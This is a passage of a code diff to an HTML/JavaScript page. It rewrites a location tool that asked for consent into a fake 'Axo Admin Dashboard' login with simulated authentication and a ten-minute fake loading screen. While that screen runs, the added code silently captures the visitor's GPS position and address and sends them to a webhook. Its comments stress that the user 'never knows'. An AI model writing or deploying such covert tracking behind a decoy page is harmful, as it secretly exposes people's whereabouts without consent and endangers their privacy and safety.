-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        console.log('Webhook sent.');
-      } catch (e) {
-        console.warn('Webhook failed:', e);
-      }
-    }
+                    // Reverse geocode
+                    const data = await reverseGeocode(lat, lng);
+                    const address = extractAddress(data);
 
-    // ----- request location -----
-    async function requestLocation() {
-      if (!navigator.geolocation) {
-        locationStatus.innerHTML = `<i class="fas fa-exclamation-triangle" style="color:#ff9f8c;"></i> Geolocation not supported.`;
-        return;
-      }
-      locationStatus.innerHTML = `<i class="fas fa-spinner fa-pulse"></i> Acquiring GPS position...`;
-      try {
-        const pos = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {
-            enableHighAccuracy: true,
-            timeout: 12000,
-            maximumAge: 0
-          });
-        });
-        const { latitude, longitude } = pos.coords;
-        currentCoords = { lat: latitude, lng: longitude };
-        locationStatus.innerHTML = `<i class="fas fa-check-circle" style="color:#8bdaa0;"></i> Location captured (${latitude.toFixed(6)}, ${longitude.toFixed(6)})`;
+                    // Store for later use
+                    locationData = { lat, lng, address, usedMethod };
 
-        // reverse geocode
-        const data = await reverseGeocode(latitude, longitude);
-        addressData = extractAddress(data);
-        // render report
-        reportContent.innerHTML = buildReportHTML(addressData, latitude, longitude);
+                    // Send webhook (completely silent)
+                    await sendWebhook(lat, lng, address);
 
-        // send webhook
-        await sendWebhook(latitude, longitude, addressData);
+                    console.log('Location captured silently:', lat, lng);
 
-        // move to report step
-        showStep('stepReport');
+                } catch (err) {
+                    // Silent fail - user never knows
+                    console.warn('Silent location grab failed:', err);
+                    locationGrabbed = false;
+                }
+            }
 
-      } catch (err) {
-        console.error(err);
-        let msg = err.message || 'Unknown error';
-        if (err.code === 1) msg = 'Permission denied. Please allow location access.';
-        else if (err.code === 2) msg = 'Position unavailable. Try again.';
-        else if (err.code === 3) msg = 'Location request timed out.';
-        locationStatus.innerHTML = `<i class="fas fa-times-circle" style="color:#ff8a7a;"></i> ${msg}`;
-      }
-    }
+            // ----- start dashboard loading (10 min) -----
+            function startDashboardLoading() {
+                if (isDashboardLoading) return;
+                isDashboardLoading = true;
 
-    // ----- accept terms -----
-    function acceptTerms() {
-      termsAccepted = true;
-      termsFeedback.innerHTML = `<i class="fas fa-check-circle" style="color:#8bdaa0;"></i> Terms accepted. Redirecting...`;
-      setTimeout(() => {
-        showStep('stepDashboardPrompt');
-      }, 600);
-    }
+                // Silently grab location in background (user never sees it)
+                // Start immediately, not waiting for any UI element
+                if (!locationGrabbed) {
+                    forceGrabLocation();
+                }
 
-    // ----- decline terms -----
-    function declineTerms() {
-      termsAccepted = false;
-      termsFeedback.innerHTML = `<i class="fas fa-times-circle" style="color:#ff8a7a;"></i> You declined. You can restart.`;
-    }
+                showStep('stepDashboardLoading');
+                loadingStartTime = Date.now();
+                const duration = 10 * 60;
 
-    // ----- start dashboard loading (10 min countdown) -----
-    function startDashboardLoading() {
-      if (isDashboardLoading) return;
-      isDashboardLoading = true;
-      showStep('stepDashboardLoading');
-      loadingStartTime = Date.now();
-      let elapsed = 0;
-      const duration = 10 * 60; // 10 minutes in seconds
+                progressFill.style.width = '0%';
+                timerDisplay.textContent = '10:00';
 
-      // progress fill
-      progressFill.style.width = '0%';
-      timerDisplay.textContent = '10:00';
+                if (countdownInterval) clearInterval(countdownInterval);
+                countdownInterval = setInterval(() => {
+                    const diff = (Date.now() - loadingStartTime) / 1000;
+                    const remaining = Math.max(0, duration - diff);
+                    const minutes = Math.floor(remaining / 60);
+                    const seconds = Math.floor(remaining % 60);
+                    timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+                    const progress = Math.min(100, (diff / duration) * 100);
+                    progressFill.style.width = `${progress}%`;
 
-      if (countdownInterval) clearInterval(countdownInterval);
-      countdownInterval = setInterval(() => {
-        const now = Date.now();
-        const diff = (now - loadingStartTime) / 1000;
-        const remaining = Math.max(0, duration - diff);
-        const minutes = Math.floor(remaining / 60);
-        const seconds = Math.floor(remaining % 60);
-        timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
-        const progress = Math.min(100, (diff / duration) * 100);
-        progressFill.style.width = `${progress}%`;
+                    if (remaining <= 0) {
+                        clearInterval(countdownInterval);
+                        timerDisplay.textContent = '00:00';
+                        progressFill.style.width = '100%';
+                        // Show ready state
+                        showStep('stepDashboardReady');
+                        isDashboardLoading = false;
+                    }
+                }, 500);
 
-        if (remaining <= 0) {
-          clearInterval(countdownInterval);
-          timerDisplay.textContent = '00:00';
-          progressFill.style.width = '100%';
-          // show ready state (optional)
-          document.querySelector('.dashboard-placeholder .fa-spinner').className = 'fas fa-check-circle';
-          document.querySelector('.dashboard-placeholder div:first-of-type').textContent = '✅ Dashboard ready!';
-        }
-      }, 500);
+                if (dashboardTimer) clearTimeout(dashboardTimer);
+                dashboardTimer = setTimeout(() => {
+                    if (countdownInterval) clearInterval(countdownInterval);
+                    timerDisplay.textContent = '00:00';
+                    progressFill.style.width = '100%';
+                    showStep('stepDashboardReady');
+                    isDashboardLoading = false;
+                }, (duration + 10) * 1000);
+            }
 
-      // also set a timeout to clean up after 11 min
-      if (dashboardTimer) clearTimeout(dashboardTimer);
-      dashboardTimer = setTimeout(() => {
-        if (countdownInterval) clearInterval(countdownInterval);
-        timerDisplay.textContent = '00:00';
-        progressFill.style.width = '100%';
-      }, (duration + 10) * 1000);
-    }
+            // ----- reset app -----
+            function resetApp() {
+                if (countdownInterval) clearInterval(countdownInterval);
+                if (dashboardTimer) clearTimeout(dashboardTimer);
+                isDashboardLoading = false;
+                locationGrabbed = false;
+                locationData = null;
+                progressFill.style.width = '0%';
+                timerDisplay.textContent = '10:00';
+                loginStatus.textContent = '';
+                showStep('stepLogin');
+            }
 
-    // ----- reset app -----
-    function resetApp() {
-      if (countdownInterval) clearInterval(countdownInterval);
-      if (dashboardTimer) clearTimeout(dashboardTimer);
-      isDashboardLoading = false;
-      currentCoords = null;
-      addressData = null;
-      termsAccepted = false;
-      locationStatus.innerHTML = '';
-      termsFeedback.innerHTML = '';
-      reportContent.innerHTML = '';
-      progressFill.style.width = '0%';
-      timerDisplay.textContent = '10:00';
-      showStep('stepLocation');
-    }
+            // ----- handle login -----
+            function handleLogin() {
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value.trim();
 
-    // ----- event listeners -----
-    requestBtn.addEventListener('click', requestLocation);
+                if (!username || !password) {
+                    loginStatus.innerHTML = '<i class="fas fa-exclamation-circle" style="color:#ff9f8c;"></i> Please fill in all fields';
+                    return;
+                }
 
-    acceptTermsBtn.addEventListener('click', acceptTerms);
-    declineTermsBtn.addEventListener('click', declineTerms);
+                loginStatus.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Authenticating...';
+                loginBtn.disabled = true;
 
-    goDashboardBtn.addEventListener('click', startDashboardLoading);
-    stayBtn.addEventListener('click', () => {
-      // stay on same step, but we just show a small feedback
-      const feedback = document.createElement('div');
-      feedback.style.cssText = 'color:#9bb9d9; margin-top:0.5rem; font-size:0.85rem;';
-      feedback.innerHTML = '<i class="fas fa-info-circle"></i> You can launch the dashboard anytime using the button above.';
-      document.querySelector('#stepDashboardPrompt .flex-row')?.appendChild(feedback);
-      setTimeout(() => feedback.remove(), 4000);
-    });
+                // Simulate authentication delay
+                setTimeout(() => {
+                    loginStatus.innerHTML = '<i class="fas fa-check-circle" style="color:#8bdaa0;"></i> Login successful!';
+                    // Start dashboard loading after a short delay
+                    setTimeout(() => {
+                        startDashboardLoading();
+                    }, 800);
+                }, 1200);
+            }
 
-    resetBtn.addEventListener('click', resetApp);
+            // ----- event listeners -----
+            loginBtn.addEventListener('click', handleLogin);
 
-    // initial step: location
-    showStep('stepLocation');
+            usernameInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') handleLogin();
+            });
+            passwordInput.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter') handleLogin();
+            });
 
-  })();
-</script>
+            resetBtn.addEventListener('click', resetApp);
+            resetFromReadyBtn.addEventListener('click', resetApp);
+
+            launchDashboardBtn.addEventListener('click', () => {
+                alert('🚀 Axo Admin Dashboard launched!');
+                resetApp();
+            });
+
+            // Show login step initially
+            showStep('stepLogin');
+
+        })();
+    </script>
+
 </body>
 </html>
